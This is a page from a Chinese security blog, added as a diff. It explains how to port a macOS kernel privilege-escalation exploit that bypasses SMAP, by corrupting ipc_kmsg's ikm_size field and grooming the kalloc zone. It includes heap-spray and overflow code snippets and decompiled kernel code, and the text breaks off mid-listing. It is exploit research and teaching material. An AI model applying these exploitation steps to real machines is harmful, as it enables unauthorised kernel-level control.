@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang=Ch>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00.前言上一篇写过的利用严格意义来说是不完美的，因为我们构造的fake port是在用户空间，在引入了SMAP机制之后，这样的做法毫无疑问就会失效了，所以我们需要去寻找新的出路，lan Beer曾经描述过如何在iOS上进行绕过，我们就来看看这个利用是如何进行的，并将其移植到Mac上
+整个利用的过程几乎是完全不同的，下面的利用过程简单的来说就是通过一次堆溢出来进行另一次溢出，其中ipc_kms">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过SMAP提权(Mac移植)">
+<meta property="og:url" content="https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/index.html">
+<meta property="og:site_name" content="Peterpan's Blog">
+<meta property="og:description" content="0x00.前言上一篇写过的利用严格意义来说是不完美的，因为我们构造的fake port是在用户空间，在引入了SMAP机制之后，这样的做法毫无疑问就会失效了，所以我们需要去寻找新的出路，lan Beer曾经描述过如何在iOS上进行绕过，我们就来看看这个利用是如何进行的，并将其移植到Mac上
+整个利用的过程几乎是完全不同的，下面的利用过程简单的来说就是通过一次堆溢出来进行另一次溢出，其中ipc_kms">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-01%20%E4%B8%8B%E5%8D%887.16.53.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-02%20%E4%B8%8A%E5%8D%8810.57.14.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-02%20%E4%B8%8A%E5%8D%8811.01.34.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-09%20%E4%B8%8B%E5%8D%883.09.37.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-02%20%E4%B8%8A%E5%8D%8811.19.15.png">
+<meta property="og:updated_time" content="2018-08-09T07:13:44.752Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="绕过SMAP提权(Mac移植)">
+<meta name="twitter:description" content="0x00.前言上一篇写过的利用严格意义来说是不完美的，因为我们构造的fake port是在用户空间，在引入了SMAP机制之后，这样的做法毫无疑问就会失效了，所以我们需要去寻找新的出路，lan Beer曾经描述过如何在iOS上进行绕过，我们就来看看这个利用是如何进行的，并将其移植到Mac上
+整个利用的过程几乎是完全不同的，下面的利用过程简单的来说就是通过一次堆溢出来进行另一次溢出，其中ipc_kms">
+<meta name="twitter:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-01%20%E4%B8%8B%E5%8D%887.16.53.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/P.png">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>绕过SMAP提权(Mac移植)</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script>
+</head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">Peterpan&#39;s Blog</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+         
+          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/07/29/通过堆风水绕过内核保护提权/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&text=绕过SMAP提权(Mac移植)"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&is_video=false&description=绕过SMAP提权(Mac移植)"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=绕过SMAP提权(Mac移植)&body=Check out this article: https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&name=绕过SMAP提权(Mac移植)&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00.前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-ipc-kmsg"><span class="toc-number">2.</span> <span class="toc-text">0x01.ipc_kmsg</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-控制数据"><span class="toc-number">3.</span> <span class="toc-text">0x01.控制数据</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-固定地址读写"><span class="toc-number">4.</span> <span class="toc-text">0x02.固定地址读写</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        绕过SMAP提权(Mac移植)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Peterpan's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-08-06T03:42:01.000Z" itemprop="datePublished">2018-08-06</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/漏洞挖掘/">漏洞挖掘</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h1><p>上一篇写过的利用严格意义来说是不完美的，因为我们构造的<code>fake port</code>是在用户空间，在引入了<code>SMAP</code>机制之后，这样的做法毫无疑问就会失效了，所以我们需要去寻找新的出路，<code>lan Beer</code>曾经描述过如何在<code>iOS</code>上进行绕过，我们就来看看这个利用是如何进行的，并将其移植到<code>Mac</code>上</p>
+<p>整个利用的过程几乎是完全不同的，下面的利用过程简单的来说就是通过一次堆溢出来进行另一次溢出，其中<code>ipc_kmsg</code>这个结构体显得尤为重要。</p>
+<h1 id="0x01-ipc-kmsg"><a href="#0x01-ipc-kmsg" class="headerlink" title="0x01.ipc_kmsg"></a>0x01.ipc_kmsg</h1><p>这个结构体的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> ipc_kmsg &#123;</div><div class="line">  <span class="keyword">mach_msg_size_t</span> ikm_size;</div><div class="line">  <span class="keyword">struct</span> ipc_kmsg * ikm_next;</div><div class="line">  <span class="keyword">struct</span> ipc_kmsg * ikm_prev;</div><div class="line">  <span class="keyword">mach_msg_header_t</span> * ikm_header;</div><div class="line">  <span class="keyword">ipc_port_t</span> ikm_prealloc;</div><div class="line">  <span class="keyword">ipc_port_t</span> ikm_voucher;</div><div class="line">  <span class="keyword">mach_msg_priority_t</span> ikm_qos;</div><div class="line">  <span class="keyword">mach_msg_priority_t</span> ikm_qos_override</div><div class="line">  <span class="keyword">struct</span> ipc_importance_elem * ikm_importance;</div><div class="line">  <span class="keyword">queue_chain_t</span> ikm_inheritance;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-01%20%E4%B8%8B%E5%8D%887.16.53.png" alt="ipc_kmsg结构"></p>
+<p>我们可以其中有一个<code>ikm_size</code>，而且这不是一个指针，我们在代码中寻找对<code>ikm_size</code>的交叉引用，我们可以看到它仅在少数几个地方使用： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ipc_kmsg_free</span><span class="params">(<span class="keyword">ipc_kmsg_t</span> kmsg)</span></span>;</div></pre></td></tr></table></figure>
+<p>此函数使用<code>kmsg-&gt;ikm_size</code> 将kmsg 释放回正确的kalloc区域。<code>zone allocator</code>将检测到错误区域的释放并<code>panic</code>，因此我们必须小心，我们不会在没有先确认合适大小的情况下释放<code>ipc_kmsg</code>。</p>
+<p><code>ikm_size</code>字段通过一个宏来设置：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ikm_init(kmsg，size)\</span></div><div class="line">MACRO_BEGIN \</div><div class="line"> (kmsg) - &gt; ikm_size =(size); \</div></pre></td></tr></table></figure>
+<p>而这个字段又被用来设置<code>ikm_header</code>字段：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ikm_set_header(kmsg，mtsize)\ </span></div><div class="line">MACRO_BEGIN \</div><div class="line"> (kmsg) - &gt; ikm_header =(<span class="keyword">mach_msg_header_t</span> *)\</div><div class="line">((<span class="keyword">vm_offset_t</span>)((kmsg)+ <span class="number">1</span>)+(kmsg) - &gt; ikm_size  - (mtsize));\</div><div class="line">MACRO_END</div></pre></td></tr></table></figure>
+<p>这将使得消息和缓冲区的末位对齐，这是一个很有趣的事情，下面会阐明为什么：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(msg_and_trailer_size&gt; kmsg-&gt; ikm_size  -  max_desc)&#123;</div><div class="line">    ip_unlock(dest_port);</div><div class="line">    <span class="keyword">return</span> MACH_SEND_TOO_LARGE;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
+<p>上面是对于接受消息的一个检查，它用来确保在<code>ikm_kmsg</code>的<code>buffer</code>有足够的空间给消息使用：</p>
+<p>那么这个<code>ipc_kmsg</code>应该如何产生呢？通过<code>mach_port_allocate_full</code>方法我们可以分配一个带有<code>ipc_kmsg</code>缓冲区的<code>mach port</code>，用来允许用户空间接受关键消息，而内核不需要再进行堆分配。每次内核发送真正的<code>mach message</code>的时候，它首先会检查端口是否拥有预先分配的缓冲区并且没有被使用，然后就会进入到下面的代码流程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(IP_VALID(dest_port)&amp;&amp; IP_PREALLOC(dest_port))&#123;</div><div class="line">    <span class="keyword">mach_msg_size_t</span> max_desc = <span class="number">0</span>;</div><div class="line">    </div><div class="line">    kmsg = dest_port-&gt; ip_premsg;</div><div class="line">    <span class="keyword">if</span>(ikm_prealloc_inuse(kmsg))&#123;</div><div class="line">      ip_unlock(dest_port);</div><div class="line">      <span class="keyword">return</span> MACH_SEND_NO_BUFFER;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(msg_and_trailer_size&gt; kmsg-&gt; ikm_size  -  max_desc)&#123;</div><div class="line">      ip_unlock(dest_port);</div><div class="line">      <span class="keyword">return</span> MACH_SEND_TOO_LARGE;</div><div class="line">    &#125;</div><div class="line">    ikm_prealloc_set_inuse(kmsg，dest_port);</div><div class="line">    ikm_set_header(kmsg，msg_and_trailer_size);</div><div class="line">    ip_unlock(dest_port);</div><div class="line">...  </div><div class="line">  (<span class="keyword">void</span>)<span class="built_in">memcpy</span>((<span class="keyword">void</span> *)kmsg-&gt; ikm_header，(<span class="keyword">const</span> <span class="keyword">void</span> *)msg，size);</div></pre></td></tr></table></figure>
+<p>上面的代码检查了<code>kmsg-&gt;ikm_size</code>的值，将缓冲区标记为<code>in-use</code>，然后调用<code>ikm_set_header</code>宏将消息对齐到缓冲区的末尾处最后调用<code>memcpy</code>将消息拷贝到缓冲区。</p>
+<p>这个时候我们不禁想到，如果我们可以修改<code>ikm_size</code>的值，这就意味着我们可以欺骗内核，让他认为这个缓冲区比它事实的大小要大，这样就意味着会产生溢出，我们可以在超过缓冲区的地方去构造消息，这也是为什么上面说的是这个利用是从一个堆溢出到另一个溢出。</p>
+<h1 id="0x01-控制数据"><a href="#0x01-控制数据" class="headerlink" title="0x01.控制数据"></a>0x01.控制数据</h1><p>这个消息利用起来还有一些难处，因为它只会在<code>kernel</code>给我们发消息的时候使用，所以我们要做的就是控制<code>kernel</code>给我们发送的消息，这听起来有些不可思议。</p>
+<p>内核只会在屈指可数的时候给用户空间发送<code>Mach message</code>，而且消息的长度必须合适，不能太短，所以<code>IODataQueue</code>这样类似的通知就不在我们的考虑范畴内，唯一能包含我们控制的数据的应该只有异常消息了。</p>
+<p>当一个线程<code>fault</code>的时候，比如说访问没有映射的内存或者软中断的时候，内核就会给线程注册的异常端口发送异常消息，如果线程没有异常处理端口，内核就会发给<code>task</code>的异常处理端口，如果这仍然失败，异常消息就会被发给一个全局的主机异常端口：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">routine <span class="title">thread_set_exception_ports</span><span class="params">(</span></span></div><div class="line">          thread:<span class="keyword">thread_act_t</span>;</div><div class="line">          exception_mask:<span class="keyword">exception_mask_t</span>;</div><div class="line">          new_port:<span class="keyword">mach_port_t</span>;</div><div class="line">          behavior:<span class="keyword">exception_behavior_t</span>;</div><div class="line">          new_flavor:<span class="keyword">thread_state_flavor_t</span>);</div></pre></td></tr></table></figure>
+<p>这是<code>thread_set_exception_ports</code>的MIG定义。<code>new_port</code>应该是新异常端口的发送权限。<code>exception_mask</code>允许我们限制我们想要处理的异常类型。<code>behavior</code>定义了我们想要接收的异常消息类型，new_flavor 允许我们指定要在消息中包含哪种进程状态。</p>
+<p>这样异常消息就会包含<code>X86</code>通用目标寄存器的状态，这也正是我们要向<code>ipc_kmsg</code>的缓冲区末尾写入的内容。</p>
+<h1 id="0x02-固定地址读写"><a href="#0x02-固定地址读写" class="headerlink" title="0x02.固定地址读写"></a>0x02.固定地址读写</h1><p>最关键的问题是我们并不知道我们控制的数据到底在哪里，我们可以将它放在用户空间，那么这样的话就和之前的做法没什么大的区别了，同样绕不开<code>x86</code>上的<code>SMAP</code>和<code>iPhone7</code>上的<code>AMCC</code>。因此我们要构造一个新的原语来找到<code>ipc_kmsg</code>在内核中的位置。</p>
+<p>之前说过要通过一个堆溢出到另一个溢出，因此我们要保证的一点就是<code>ipc_kmsg</code>的连续，我们知道<code>freelist</code>随机化之后要得到一片连续的端口是比较困难的，但是通过观察<code>zalloc</code>堆的演变，我们可以通过一种极限的方式来实现目标。通过耗尽特定区域，我们可以强制zalloc获取新页面，如果我们的分配大小接近页面大小，我们将立即返回该页面。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> prealloc_size = <span class="number">0x900</span>; <span class="comment">// kalloc.4096</span></div><div class="line"> <span class="comment">//耗尽kalloc.4096的页面</span></div><div class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="number">2000</span>; i++)&#123;</div><div class="line">   prealloc_port(prealloc_size);</div><div class="line"> &#125;</div><div class="line"> </div><div class="line"> <span class="comment">//现在这些都是连续的</span></div><div class="line"> <span class="keyword">mach_port_t</span> holder = prealloc_port(prealloc_size);</div><div class="line"> <span class="keyword">mach_port_t</span> first_port = prealloc_port(prealloc_size);</div><div class="line"> <span class="keyword">mach_port_t</span> second_port = prealloc_port(prealloc_size);</div></pre></td></tr></table></figure>
+<p>这样我们新请求的堆布局应该长这个样子：</p>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-02%20%E4%B8%8A%E5%8D%8810.57.14.png" alt="堆布局"></p>
+<p>在不同的设备上这个值应该是不尽相同的，对于拥有更多<code>RAM</code>的设备也许你应该请求更多的页面，这并不是一种可靠的技术，但是通过调整还是可以达到效果。</p>
+<p>现在我们就可以利用<code>mach_voucher</code>做第一个溢出：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"> mach_port_destroy(mach_task_self()，holder);</div><div class="line"></div><div class="line"><span class="comment">//重新分配holder并溢出</span></div><div class="line"><span class="keyword">uint64_t</span> overflow_bytes [] = &#123;<span class="number">0x109c</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</div><div class="line">do_overflow(<span class="number">0x1000</span>,<span class="number">64</span>，overflow_bytes);</div><div class="line">  </div><div class="line"><span class="comment">//因为mach_voucher已经通过kfree释放掉了，我们要再次占住holder</span></div><div class="line">holder = prealloc_port(prealloc_size);</div></pre></td></tr></table></figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-02%20%E4%B8%8A%E5%8D%8811.01.34.png" alt="第一次溢出内存布局"></p>
+<p>溢出的数据把<code>first_kmsg</code>的<code>ikm_size</code>字段覆盖为<code>0x109c</code>大小了，这就意味着消息缓冲区已经覆盖了<code>second_kmsg</code>的头部了，那么这个值到底是通过什么来确定的呢？首先我们需要通过阅读源码做一些参考，了解一下<code>ipc_kmsg_get_from_kernel</code>这个函数，并将它和反编译的流程对应上，再通过IDA查看相关的偏移，看源码的工具可以使用<code>understand，</code>对于反编译之后的代码我做了一些注释，方便理解：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">ipc_kmsg_get_from_kernel</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">void</span> ***a3)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">void</span> ***v3; <span class="comment">// r14</span></div><div class="line">  __int64 v4; <span class="comment">// rbx</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// er13</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v6; <span class="comment">// r14</span></div><div class="line">  __int64 result; <span class="comment">// rax</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// et0</span></div><div class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// rt0</span></div><div class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// rcx</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// et0</span></div><div class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// rt0</span></div><div class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// rcx</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// et0</span></div><div class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// rt0</span></div><div class="line">  <span class="keyword">unsigned</span> __int64 v16; <span class="comment">// rcx</span></div><div class="line">  <span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *v17; <span class="comment">// rbx</span></div><div class="line">  <span class="keyword">signed</span> __int32 v18; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v19; <span class="comment">// et0</span></div><div class="line">  <span class="keyword">unsigned</span> __int64 v20; <span class="comment">// rt0</span></div><div class="line">  <span class="keyword">unsigned</span> __int64 v21; <span class="comment">// rax</span></div><div class="line">  __int64 v22; <span class="comment">// rax</span></div><div class="line">  _QWORD *v23; <span class="comment">// [rsp+8h] [rbp-38h]</span></div><div class="line">  <span class="keyword">void</span> ***v24; <span class="comment">// [rsp+10h] [rbp-30h]</span></div><div class="line"></div><div class="line">  v3 = a3;</div><div class="line">  v4 = *((_QWORD *)a1 + <span class="number">1</span>);</div><div class="line">  v5 = a2 + <span class="number">0x44</span>;                               <span class="comment">// msg_and_trailer_size = size + MAX_TRAILER_SIZE;</span></div><div class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(v4 + <span class="number">1</span>) &lt; <span class="number">2</span> || *(_WORD *)v4 &gt;= <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    v24 = a3;</div><div class="line">    v6 = ipc_kmsg_alloc(v5);                    <span class="comment">//  kmsg = ipc_kmsg_alloc(msg_and_trailer_size);</span></div><div class="line">    result = <span class="number">0x1000000D</span>LL;                      <span class="comment">// mach_send_no_buffer</span></div><div class="line">    <span class="keyword">if</span> ( !v6 )</div><div class="line">      <span class="keyword">return</span> result;</div><div class="line">LABEL_27:</div><div class="line">    real_mode_bootstrap_end(*((<span class="keyword">void</span> **)v6 + <span class="number">3</span>), a1, a2);<span class="comment">// (void) memcpy((void *) kmsg-&gt;ikm_header, (const void *) msg, size);</span></div><div class="line">    v22 = *((_QWORD *)v6 + <span class="number">3</span>);</div><div class="line">    *(_DWORD *)(v22 + <span class="number">4</span>) = a2;                  <span class="comment">// trailer = (mach_msg_max_trailer_t *) </span></div><div class="line">                                                <span class="comment">//               ((vm_offset_t)kmsg-&gt;ikm_header + size);</span></div><div class="line">    *(<span class="keyword">security_token_t</span> *)(v22 + a2 + <span class="number">12</span>) = KERNEL_SECURITY_TOKEN;<span class="comment">// trailer-&gt;msgh_sender = KERNEL_SECURITY_TOKEN;</span></div><div class="line">    *(<span class="keyword">audit_token_t</span> *)(v22 + a2 + <span class="number">20</span>) = KERNEL_AUDIT_TOKEN;<span class="comment">// trailer-&gt;msgh_audit = KERNEL_AUDIT_TOKEN;</span></div><div class="line">    *(_DWORD *)(v22 + a2) = <span class="number">0</span>;                  <span class="comment">// trailer-&gt;msgh_trailer_type = 